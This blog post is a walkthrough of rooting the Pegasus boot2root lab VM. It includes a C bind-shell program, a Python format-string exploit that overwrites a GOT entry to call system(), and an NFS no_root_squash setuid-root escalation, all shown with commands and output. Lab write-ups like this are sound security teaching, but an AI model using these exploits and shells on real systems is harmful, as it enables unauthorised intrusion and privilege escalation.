
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Because she was a princess she had a Pegasus. - FourFourFourFour</title>
  <meta name="author" content="recrudesce">

  
  <meta name="description" content="Tweet Because She Was a Princess She Had a Pegasus. Dec 19th, 2014 1:50 pm vm's Knapsy (blog) released Pegasus - to be honest I was supposed to beta &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://recrudesce.github.io/blog/2014/12/19/because-she-was-a-princess-she-had-a-pegasus/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body >
  <header role="banner" id="sidebar">
    <!-- Logo -->
<aside id="logo" class="clearfix">
  <div class="clearfix">
    <a href="/">FourFourFourFour</a>
  </div>
</aside>

<ul id="menu">

  <li class="title">
    <h1 id="title"><a href="/">FourFourFourFour</a></h1>
  </li>


  <li class="subtitle">
    <h2 id="subtitle">A Feeble Attempt At A Blog.</h2>
  </li>

  <li class="link">
    <a href="/about/">about</a>
  </li>

  <li class="link">
    <a href="http://twitter.com/recrudesce/">twitter</a>
  </li>


  <li class="link rss">
    <a href="/atom.xml">rss feed</a>
  </li>
</ul>


<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:recrudesce.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>


<!-- Octopress Love -->
<aside id="octopress_linkback">
  <a href="http://octopress.org/">
    <span class="unicode_square">
      <span class="unicode_circle">
        &nbsp;
      </span>
    </span>
    <span class="octopress">Powered by Octopress</span>
  </a>
</aside>

  </header>
  <section id="main">
    <article class="post">
  <div class="sharing-box">
  
  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://recrudesce.github.io/blog/2014/12/19/because-she-was-a-princess-she-had-a-pegasus/" data-via="recrudesce" data-counturl="http://recrudesce.github.io/blog/2014/12/19/because-she-was-a-princess-she-had-a-pegasus/" data-size="large">Tweet</a>
  
  
  
</div>

  
  <header>
    
      <h2 class="entry-title">Because She Was a Princess She Had a Pegasus.</h2>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-12-19T13:50:49+00:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>19</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>1:50 pm</span></time>
		

<span class="categories">
  
    <a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>
  
</span>


        
      </p>
    
  </header>


<p><a href="https://twitter.com/theknapsy">Knapsy</a> (<a href="https://knapsy.github.io/">blog</a>) released <a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus</a> - to be honest I was supposed to beta test it, but I kinda didn&rsquo;t get a chance to. However, it allowed me to experience the VM at the same time as everyone else.</p>

<p>People generally work alone on VM&rsquo;s, so to mix it up a bit, I decided to team up with <a href="https://twitter.com/barrebas">barrebas</a> (<a href="https://barrebas.github.io/">blog</a>) and own the VM as a collaboration :)</p>

<p>So, here&rsquo;s a quick walkthrough on how to root Pegasus, written by both barrebas and myself.</p>

<!-- more -->


<h1>Getting a Foot(hoof?)hold</h1>

<p><img src="http://awesomelytechie.com/wp-content/uploads/2013/08/Lets-get-down-to-business.gif" alt="" /></p>

<p>An NMAP scan shows that the VM only has a few ports open that are of interest - 22 and 8088</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sS -p- -T5 172.16.231.132
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-19 13:31 GMT
</span><span class='line'>Nmap scan report for 172.16.231.132
</span><span class='line'>Host is up (0.000063s latency).
</span><span class='line'>Not shown: 65526 closed ports
</span><span class='line'>PORT      STATE SERVICE
</span><span class='line'>22/tcp    open  ssh
</span><span class='line'>111/tcp   open  rpcbind
</span><span class='line'>8088/tcp  open  radan-http
</span><span class='line'>
</span><span class='line'>MAC Address: 00:0C:29:E3:2A:04 (VMware)
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 14.74 seconds
</span><span class='line'>root@kali:~#</span></code></pre></td></tr></table></div></figure>


<p>8088, when visited with a browser, shows a lovely picture of a Pegasus. A quick look at the source doesn&rsquo;t reveal anything, and there&rsquo;s nothing hidden in the image file.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_001.png" alt="pegasus_001" /></a></p>

<p>Time to brute force some directories/files. Experience has shown me that vulnerable VM creators are sneaky gits, so I opted to use a large dictionary here, just to see what it came up with. Because of this large dictionary, I had to use dirbuster instead of dirb, because dirb takes ages to parse large dictionary files. Prepare for some horrible UI screenshots&hellip;</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_002.png" alt="pegasus_002" /></a></p>

<p>I&rsquo;m only interested in the files that returned HTTP 200, as these actually exist, so submit.php and codereview.php</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_003.png" alt="pegasus_003" /></a></p>

<p>codereview.php POSTS to submit.php, so for the moment I can ignore submit.php and focus on codereview.php</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_004.png" alt="pegasus_004" /></a></p>

<p><img src="http://i527.photobucket.com/albums/cc352/gabzylovescrack/HTTYD/Shudder.gif" alt="" /></p>

<p>Mike is a code reviewer, and a trainee&hellip; therefore is pretty inexperienced. After a bit of time throwing various languages at the application, I found out that if you provide C sourcecode, it gets compiled and executed. Nice ! Lets bash some shellcode in there - specifically a bind shell and submit it.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">clientfd</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">dstport</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">o</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">mysockaddr</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>        <span class="c1">//setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;o, sizeof(o)); //a luxury we don&#39;t have space for</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span> <span class="c1">//2</span>
</span><span class='line'>        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">dstport</span><span class="p">);</span>
</span><span class='line'>        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span> <span class="c1">//0</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">mysockaddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mysockaddr</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">clientfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>A quick NMAP scan confirms port 4444 has been opened.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">p4444</span> <span class="o">-</span><span class="n">T5</span> <span class="mf">172.16.231.132</span>
</span><span class='line'>
</span><span class='line'><span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">6.47</span> <span class="p">(</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//nmap.org ) at 2014-12-19 13:47 GMT</span>
</span><span class='line'><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">172.16.231.132</span>
</span><span class='line'><span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.00040</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
</span><span class='line'><span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>
</span><span class='line'><span class="mi">4444</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">krb524</span>
</span><span class='line'><span class="n">MAC</span> <span class="nl">Address</span><span class="p">:</span> <span class="mo">00</span><span class="o">:</span><span class="mi">0</span><span class="nl">C</span><span class="p">:</span><span class="mi">29</span><span class="o">:</span><span class="nl">E3</span><span class="p">:</span><span class="mi">2</span><span class="nl">A</span><span class="p">:</span><span class="mo">04</span> <span class="p">(</span><span class="n">VMware</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">Nmap</span> <span class="nl">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="n">in</span> <span class="mf">13.04</span> <span class="n">seconds</span>
</span><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span>
</span></code></pre></td></tr></table></div></figure>


<p>A quick connection to the port via Netcat and a bit of Python allow us to get a TTY enabled shell.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nv</span> <span class="mf">172.16.231.132</span> <span class="mi">4444</span>
</span><span class='line'><span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">172.16.231.132</span><span class="p">]</span> <span class="mi">4444</span> <span class="p">(</span><span class="o">?</span><span class="p">)</span> <span class="n">open</span>
</span><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">import</span> <span class="n">pty</span><span class="p">;</span><span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">)</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">mike</span><span class="err">@</span><span class="nl">pegasus</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">mike</span><span class="err">$</span> <span class="n">id</span>
</span><span class='line'><span class="n">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">mike</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">mike</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">mike</span><span class="p">)</span>
</span><span class='line'><span class="n">mike</span><span class="err">@</span><span class="nl">pegasus</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">mike</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now over to barrebas for the next step ! <em>fancy screen wipe animation</em></p>

<hr />

<p>So as user &ldquo;mike&rdquo;, I started poking around in the setuid binary &ldquo;my_first&rdquo;. It seemed to be some sort of C program with several functions:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
mike@pegasus:~$ ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit
[/plain]</p>

<p>The mail in /var/mail/mike mentions a git repo with the source code. We started attacking the binary without looking at the code, because the vulnerability jumped up quickly. The third option was not implemented and the reverse string operation seemed to be secure. I then went for the calculator, entering:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
Selection: 1</p>

<p>Enter first number: 5
Enter second number: AAAA
Error details: AAAA
[/plain]</p>

<p>That seemed promising. I entered:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
Selection: 1</p>

<p>Enter first number: 5
Enter second number: %x
Error details: bff1039c
[/plain]</p>

<p>And we have our format string vulnerability! The basic idea now was to abuse it and overwrite a got pointer. I chose printf as the target and I wanted to overwrite it with the address of system. ASLR was enabled on pegasus, but because it is a 32 bit box, we can easily &ldquo;fix&rdquo; this with <code>ulimit -s unlimited</code>. This enlarges the stack and fixes the address of libc:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ ldd my_first
    linux-gate.so.1 =>  (0x40022000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x4002a000)
    /lib/ld-linux.so.2 (0x40000000)
[/plain]</p>

<p>Finding the address of system within gdb was trivial. The got pointer address can be found using objdump:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
080483b0 &lt;printf@plt>:
 80483b0:   ff 25 fc 9b 04 08       jmp    *0x8049bfc
 80483b6:   68 00 00 00 00          push   $0x0
 80483bb:   e9 e0 ff ff ff          jmp    80483a0 &lt;_init+0x2c>
[/plain]</p>

<p>So it&rsquo;s at 0x8049bfc. Now we needed to find the start of the format string on the stack. Recrudesce quickly identified it as argument number 8:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
Selection: 1</p>

<p>Enter first number: 5
Enter second number: AAAA%8$x
Error details: AAAA41414141
[/plain]</p>

<p>So I got working on an exploit. I quickly came up with this python script:</p>

<p>[python]</p>

<h1>!/usr/bin/python</h1>

<p>import struct</p>

<p>def p(x):
  return struct.pack(&ldquo;&lt;L&rdquo;, x)</p>

<p>payload = &ldquo;&rdquo;</p>

<h1>start calculator thingie</h1>

<p>payload += &ldquo;1\n5\n&rdquo;</p>

<h1>overwrite first part of got pointer</h1>

<p>payload += p(0x8049bfe)
payload += &ldquo;%16386c%8$hn&rdquo;</p>

<h1>overwrite second part of got pointer</h1>

<p>payload += p(0x8049bfc)
payload += &ldquo;%20566c%12$hn&rdquo;</p>

<p>payload += &ldquo;\n&rdquo;</p>

<h1>exit program</h1>

<p>payload += &ldquo;4\n&rdquo;
print payload
[/python]</p>

<p>The format string first writes some dummy bytes and then overwrites the first part of the got pointer. It takes the 8th argument off the stack and uses %hn to write a half-nibble to that address. The value is the number of bytes that have been written.</p>

<p>Then, it takes the 12th argument, which is the pointer to the second half of the got entry. It writes some dummy bytes and then the outputs the number of bytes written to the got address. Effectively, after running the exploit, the memory location at 0x8049bfc now contains 0x40069060. This is the address of system in libc after running the ulimit trick.</p>

<p>So if we run this exploit, the next time printf() will be called by the binary, it will call system() instead!</p>

<p>[plain gutter=&ldquo;false&rdquo;]
mike@pegasus:~$ python exploit.py | ./my_first</p>

<p>&hellip;snip&hellip;</p>

<p>sh: 1: Selection:: not found</p>

<p>Goodbye!
[/plain]</p>

<p>OK, we have system() being called! So to fully exploit it and grant us a shell, we make a symlink to /bin/dash and call it &ldquo;Selection:&rdquo;. Finally we need to set the PATH environment variable so that the shell searches in the current directory and finds our symlink. The exploit is pushed to the binary via stdin and the cat command then catches the shell that is being spawned (otherwise it closes immediately).</p>

<p>[plain gutter=&ldquo;false&rdquo;]
mike@pegasus:~$ ln -s /bin/dash Selection:
mike@pegasus:~$ export PATH=&ldquo;.:$PATH&rdquo;
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ (python ./exploit.py; cat) | ./my_first</p>

<p>&hellip;snip&hellip;</p>

<p>id
uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
[/plain]</p>

<p>So we now have a shell as john! I wanted to spawn another shell (using python) to get a pty, but it wouldn&rsquo;t let me:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
Traceback (most recent call last):
  File &ldquo;<string>&rdquo;, line 1, in <module>
  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 165, in spawn
    pid, master_fd = fork()
  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 107, in fork
    master_fd, slave_fd = openpty()
  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 29, in openpty
    master_fd, slave_name = <em>open_terminal()
  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 70, in </em>open_terminal
    raise os.error, &lsquo;out of pty devices&rsquo;
OSError: out of pty devices
[/plain]</p>

<p>This is probably because our little trainee &ldquo;mike&rdquo; is not a real person and is using up all our pty&rsquo;s! No problem, we thought, let&rsquo;s upload our ssh keys&hellip; only that failed, because our gid is set to mike and not john. Hmmm.. I wrote a small C wrapper to try and set gid and uid to 1000 (john) but it wouldn&rsquo;t let me set gid.</p>

<p>[c]</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<p>int main(int argc, char *argv[]){
setreuid(geteuid(), geteuid());
setregid(geteuid(), geteuid());</p>

<p>execv(&ldquo;/bin/dash&rdquo;, argv);
return 0;
}
[/c]</p>

<p>But this did have the nice side-effect of allowing us a to spawn a pty shell!</p>

<p>[plain gutter=&ldquo;false&rdquo;]
/tmp/a.out
id
uid=1000(john) gid=1001(mike) groups=1000(john),1001(mike)
python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
john@pegasus:~$ sudo -l
sudo -l
Matching Defaults entries for john on this host:
    env_reset,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>

<p>User john may run the following commands on this host:
    (root) NOPASSWD: /usr/local/sbin/nfs
[/plain]</p>

<p>Nice! Now we can see that john is allowed to start the nfs daemon&hellip; Interesting, because /etc/exports lists the following entry:</p>

<p>[plain gutter=&ldquo;false&rdquo;]
/opt/nfs    *(rw,sync,crossmnt,no_subtree_check,no_root_squash
[/plain]</p>

<p>no_root_squash&hellip; we can mount it remotely and have our own uid! NFS will not set it to nobody:nobody&hellip;</p>

<p>Over to recrudesce for the last bit of pwning pegasus!</p>

<hr />

<p>Before I continue, lets hear it for barrebas and his exploit dev skills.</p>

<p><img src="http://www.thepoke.co.uk/wp-content/uploads/2013/11/applause-3.gif" alt="" /></p>

<p>So, NFS huh ? What can I do with that ? <em>thinks</em>&hellip; well, I can mount it remotely and drop a file as root on my Kali box, suid the binary and execute it on Pegasus as john.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@kali:~# mount -t nfs 172.16.231.132:/opt/nfs /mnt/nfs
root@kali:~# cd /mnt/nfs
root@kali:/mnt/nfs# ls -la
total 8
drwxr-xr-x 2 root root 4096 Nov 18 03:43 .
drwxr-xr-x 4 root root 4096 Dec 19 13:09 ..
[/plain]</p>

<p>OK, so a quick side note here - my Kali box is 64 bit&hellip; if it were 32 bit I could just copy /bin/sh to /mnt/nfs and suid it. So, in this case, I have to use a C wrapper to execute a shell instead.</p>

<p>The code for the C wrapper is pretty straight forward</p>

<p>[c]
int main(void)
{
        system(&ldquo;/bin/dash&rdquo;);
}
[/c]</p>

<p>This is then compiled as a 32 bit binary, dropped into /mnt/nfs on my Kali box, and chmodded to 4777</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@kali:/mnt/nfs# gcc wrapper.c -m32
root@kali:/mnt/nfs# chmod 4777 a.out
[/plain]</p>

<p>Which, when executed as user john, drops me to a root shell</p>

<p>[plain gutter=&ldquo;false&rdquo;]
john@pegasus:/opt/nfs$ ls -la
ls -la
total 32
drwxr-xr-x 2 root root 4096 Dec 20 00:17 .
drwxr-xr-x 5 root root 4096 Nov 18 20:51 ..
-rwsrwxrwx 1 root root 7160 Dec 20 00:17 a.out
john@pegasus:/opt/nfs$ ./moo2
./a.out</p>

<h1>id</h1>

<p>uid=1000(john) gid=1001(mike) euid=0(root) groups=0(root),1001(mike)
[/plain]</p>

<p>Allowing the grail of grails&hellip; the ability to cat /root/flag</p>

<p>[plain gutter=&ldquo;false&rdquo;]</p>

<h1>cat flag</h1>

<p>cat flag
               ,
               |<code>\
              /'_/_
            ,'_/\_/\_                       ,
          ,'_/\'_\_,/_                    ,'|
        ,'_/\_'_ \_ \_/                _,-'_/
      ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
    ,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
   ( (' )\/(_ \_ \'_,\   __--' _,-_/_,-',_/ _\      mythology. He is a winged
    \_</code>> 6<code>7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted
     \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.
      \_'/&gt;   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.
        &gt;/  _ ,V  ,&lt;  \__ '\,_'_ \_ \'_,/
      /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also
     ( ) \_ \|_ </code>_    _,/&lsquo;\,<em>&rsquo;</em>,/&lsquo;               a video game system sold in
      \<em>  __)    <code>\_                             Poland, Serbia and Bosnia.
       \_)   &gt;       </code>_                           It was a hardware clone of
            /  <code>,      |</code>_                         the Nintendo Famicom.
           /    \     / \ <code>\
          /   __/|   /  / </code>\
         (<code> (   (</code> (</em>  \   /
         /  ,/    |  /  /   \
        / ,/      | /   \   `_
      <em>/</em>/        |/    /<em><em>/,</em>/
     /</em>(         /_(</p>

<p>CONGRATULATIONS! You made it :)</p>

<p>Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
learnt a thing or two while doing it! :)</p>

<p>Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
providing first review.</p>

<p>Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
and leave some feedback, I would love to hear from you!</p>

<p>Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
more awesome boot2root VMs!
[/plain]</p>

<p><img src="http://media.tumblr.com/tumblr_m7bmngSpkh1rs4olx.gif" alt="" /></p>



</article>


    <nav role="navigation" id="pagination">

</nav>
  </section>
  

  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>




</body>
</html>
